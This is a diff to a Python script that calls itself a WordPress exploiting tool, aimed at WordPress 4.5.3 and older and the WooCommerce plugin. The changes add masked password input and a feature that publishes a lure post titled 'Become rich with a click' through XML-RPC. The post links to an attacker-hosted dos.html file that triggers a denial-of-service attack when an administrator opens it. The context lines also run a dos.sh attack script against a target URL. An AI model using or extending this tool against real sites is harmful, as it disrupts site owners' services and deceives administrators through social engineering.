@@ -1,12 +1,20 @@
 #Wordpress exploiting tool designed by DavideCube
 #Works on Wordpress version <= 4.5.3 and the WooCommerce Plugin version
+# Remember: 
+# pip3 install bs4
+# pip3 install mutagen
+# pip3 install requests
+# pip3 install python-wordpress-xmlrpc
 from bs4 import BeautifulSoup
 from mutagen.easyid3 import EasyID3
+from wordpress_xmlrpc import Client, WordPressPost
+from wordpress_xmlrpc.methods.posts import GetPosts, NewPost
 import mutagen
 import re
 import urllib.request
 import os
 import requests
+import getpass
 from modules import Support
 
 
@@ -100,7 +108,7 @@ while not(choice_num == 99):
 		print("   ******************************************************************") 
 		print(" - In order to perform this exploit, you need at least a subscriber account.")
 		username = input(" - Insert username: ")
-		password = input(" - Insert password: ")
+		password = getpass.getpass(prompt = " - Insert password: ", stream = None)
 		os.system("sh modules/Dos/dos.sh " + url + " " + username + " " + password)
 		print(" - DOS attack performed succesfully on target " + url)
 		print("   ------------------------------------------------------------------")
@@ -183,9 +191,29 @@ while not(choice_num == 99):
 		for i in range(25):
 			external_file.write(item)
 
+
 		print(" - At this point a file dos.html is generated in the modules/XSS_DOS folder.") 
-		print(" - Move the html file on a reachable server. ")
+		print(" - Move the html file on a reachable server.")
 		print(" - Convince an administrator to visit that webpage. This would perform a DOS attack.")
+		print(" - If you are an author, the script can create a post for you, with a link to the dos.html file.")
+		user_dos_choice = input(" - Press 1 if you are an author and you want create a post now (press 2 if you want to continue): ")
+
+		if user_dos_choice.isdigit() and int(user_dos_choice) == 1:
+
+			dos_html_url = input(" - Put here the address to reach the dos.html file: ")
+			dos_username = input(" - Insert your username:")
+			dos_password = getpass.getpass(prompt = " - Insert your password:", stream = None)
+			wp = Client(url + '/xmlrpc.php', dos_username, dos_password)
+
+			post = WordPressPost()
+			post.title = 'Become rich with a click'
+			post.content = 'Click <a href= "' + dos_html_url + '">here</a>'
+			post.post_status = 'publish'
+			wp.call(NewPost(post))
+			print(" - Post created succesfully")
+
+
+		
 		print("   ------------------------------------------------------------------")
 		print("\n")
 
